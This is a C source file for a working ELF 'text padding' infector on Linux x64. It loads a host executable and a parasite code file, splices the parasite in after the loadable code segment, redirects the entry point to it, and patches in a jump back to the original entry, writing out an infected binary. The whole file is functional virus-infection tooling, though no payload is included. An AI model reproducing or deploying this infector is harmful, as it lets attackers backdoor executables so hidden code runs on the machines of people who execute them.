
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <elf.h>

#include <sys/types.h>
#include <sys/stat.h>

#ifndef EXIT_SUCCESS
#define EXIT_SUCCESS		0
#endif
#ifndef EXIT_FAILURE
#define EXIT_FAILURE	       -1
#endif

// Text padding infection can expand to 0x200000 size in linux x64
#define PAGE_SIZE		0x200000

int load_file (char *filename, char **mem);

int main (int argc, char **argv)
{
	int fd, i, size_h, size_p;
	char *host, *parasite, *evil;
	char jmp_entry[] = {0xe9, 0x00, 0x00, 0x00, 0x00};

	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	Elf64_Addr o_entry;
	Elf64_Addr parasite_addr;
	Elf64_Off parasite_off;

	if (argc != 4)
	{
		printf ("Usage: <host> <parasite> <output>\n");
		exit (EXIT_SUCCESS);
	}

	size_h = load_file (argv[1], &host);
	size_p = load_file (argv[2], &parasite);

	if ((fd = open (argv[3], O_CREAT | O_WRONLY, 0755)) < 0)
	{
		fprintf (stderr, "Open %s failed\n", argv[3]);
		exit (EXIT_FAILURE);
	}
	if (!(evil = (char *)malloc (size_h + PAGE_SIZE)))
	{
		fprintf (stderr, "Malloc %s failed\n", argv[3]);
		exit (EXIT_FAILURE);
	}
	memset (evil, 0, size_h + PAGE_SIZE);

	ehdr = (Elf64_Ehdr *)(host);
	phdr = (Elf64_Phdr *)(host + ehdr->e_phoff);
	shdr = (Elf64_Shdr *)(host + ehdr->e_shoff);

	if (host[0] != 0x7f || strncmp (host+1, "ELF", 3))
	{
		fprintf (stderr, "File %s is not an elf file\n", argv[1]);
		exit (EXIT_FAILURE);
	}
	if (ehdr->e_type != ET_EXEC)
	{
		fprintf (stderr, "File %s is not an elf executable file\n", argv[1]);
		exit (EXIT_FAILURE);
	}

	// save old entry point, find code segment and adjust it to insert parasite code
	o_entry = ehdr->e_entry;
	ehdr->e_shoff += PAGE_SIZE;
	for (i = 0; i < ehdr->e_phnum; i++)
	{
		if (phdr[i].p_type == PT_LOAD && !phdr[i].p_offset)
		{
			parasite_off = phdr[i].p_offset + phdr[i].p_filesz;
			parasite_addr = phdr[i].p_vaddr + phdr[i].p_memsz;
			phdr[i].p_filesz += size_p + sizeof (jmp_entry);
			phdr[i].p_memsz += size_p + sizeof (jmp_entry);
			ehdr->e_entry = parasite_addr;

			for (i++; i < ehdr->e_phnum; i++)
				phdr[i].p_offset += PAGE_SIZE;
			break;
		}
	}

	// Adjust section header offset and size (which is after parasite code offset)
	for (i = 0; i < ehdr->e_shnum; i++)
	{
		if (shdr[i].sh_offset > parasite_off)
			shdr[i].sh_offset += PAGE_SIZE;
		else if (shdr[i].sh_addr + shdr[i].sh_size == parasite_addr)
			shdr[i].sh_size += size_p + sizeof (jmp_entry);
	}

	// Calculate return address
	*(Elf64_Word *)(jmp_entry + 1) = \
		(Elf64_Word)(o_entry - parasite_addr - size_p - sizeof (jmp_entry));

	// Generate new file using infected ELF file
	memcpy (evil, host, parasite_off);
	memcpy (evil + parasite_off, parasite, size_p);
	memcpy (evil + parasite_off + size_p, jmp_entry, sizeof (jmp_entry));
	memcpy (evil + parasite_off + PAGE_SIZE, host + parasite_off, size_h - parasite_off);

	write (fd, evil, size_h + PAGE_SIZE);

	close (fd);
	free (host);
	free (parasite);
	free (evil);

	exit (0);
}

/*
 * load_file - Open target file and load it into memory
 */
int load_file (char *filename, char **mem)
{
	int fd, err_index;
	struct stat st;
	char *err_msg[] = {"Open", "Fstat", "Malloc", "Read"};

	if ((fd = open (filename, O_RDONLY)) < 0)
	{
		err_index = 0;
		goto FAILED;
	}
	if (fstat (fd, &st) < 0)
	{
		err_index = 1;
		goto FAILED;
	}
	if (!(*mem = (char *)malloc (st.st_size)))
	{
		err_index = 2;
		goto FAILED;
	}
	if (read (fd, *mem, st.st_size) != st.st_size)
	{
		err_index = 3;
		goto FAILED;
	}
	close (fd);

	return st.st_size;

FAILED:
	fprintf (stderr, "%s %s failed\n", err_msg[err_index], filename);
	exit (EXIT_FAILURE);
}
